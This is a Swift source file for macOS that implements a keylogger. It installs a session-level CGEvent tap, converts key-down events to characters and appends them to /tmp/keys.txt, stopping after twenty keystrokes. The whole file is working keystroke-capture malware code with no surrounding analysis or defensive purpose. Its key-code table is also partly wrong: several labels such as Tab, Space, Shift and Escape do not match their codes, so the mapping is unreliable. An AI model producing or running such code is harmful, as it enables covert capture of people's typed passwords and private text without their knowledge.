import Cocoa

let logFile = "/tmp/keys.txt"
var eventCount = 0
let maxEvents = 20

let keyMap: [Int: String] = [
  0: "A", 1: "S", 2: "D", 3: "F", 4: "H", 5: "G", 6: "Z", 7: "X", 8: "C", 9: "V",
  10: "", 11: "B", 12: "Q", 13: "W", 14: "E", 15: "R", 16: "Y", 17: "T", 18: "1", 19: "2",
  20: "3", 21: "4", 22: "6", 23: "5", 24: "=", 25: "9", 26: "7", 27: "-", 28: "8", 29: "0",
  30: "]", 31: "O", 32: "U", 33: "[", 34: "I", 35: "P", 36: "", 37: "L", 38: "J", 39: "'", 40: "K",
  41: ";", 42: "\\", 43: ",", 44: "/", 45: "N", 46: "M", 47: ".", 48: "`", 49: "Tab", 50: "Space",
  51: "Shift", 52: "Caps Lock", 53: "Alt", 54: "", 55: "", 56: "", 57: "", 58: "", 59: "", 60: "",
  61: "", 62: "", 63: "Application", 64: "Help", 65: ".", 66: "Enter", 67: "*", 68: "Escape", 69: "+",
  70: "F1", 71: "F2", 72: "F3", 73: "F4", 74: "F5", 75: "F6", 76: "F7", 77: "F8", 78: "F9", 79: "F10",
  80: "F11", 81: "F12", 82: "0", 83: "1", 84: "2", 85: "3", 86: "4", 87: "5", 88: "6", 89: "7", 90: "8",
  91: "9",
]

func keyCodeToChar(_ keyCode: Int) -> String {
  return keyMap[keyCode] ?? "[\(keyCode)]"
}

func keyloggerCallback(proxy: CGEventTapProxy, type: CGEventType, event: CGEvent, refcon: UnsafeMutableRawPointer?) -> Unmanaged<CGEvent>? {
  // Extra safety check to make sure the event is actually the right one (key down)
  if type == .keyDown {
    let keyCode = Int(event.getIntegerValueField(.keyboardEventKeycode))
    let char = keyCodeToChar(keyCode)
    let log = "Key pressed: \(char)\n"
    if let data = log.data(using: .utf8) {
      if let fileHandle = FileHandle(forWritingAtPath: logFile) {
        fileHandle.seekToEndOfFile()
        fileHandle.write(data)
        fileHandle.closeFile()
      } else {
        FileManager.default.createFile(atPath: logFile, contents: data, attributes: nil)
      }
    }
    eventCount += 1
    if eventCount >= maxEvents {
      CFRunLoopStop(CFRunLoopGetCurrent())
      print("Maximum number of events reached. Stopping.")
    }
  }
  return Unmanaged.passUnretained(event)
}

let eventMask = (1 << CGEventType.keyDown.rawValue)
print("Creating event tap:")
if let eventTap = CGEvent.tapCreate(
  tap: .cgSessionEventTap, // Could use the more low level .hidEventTap, but this is easier
  place: .headInsertEventTap,
  options: .defaultTap,
  eventsOfInterest: CGEventMask(eventMask),
  callback: keyloggerCallback,
  userInfo: nil
) {
  print("Starting run loop:")
  let runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0)
  CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, .commonModes)
  CGEvent.tapEnable(tap: eventTap, enable: true)
  CFRunLoopRun()
} else {
  print("Failed to create event tap. Make sure the app has Accessibility permissions.")
}
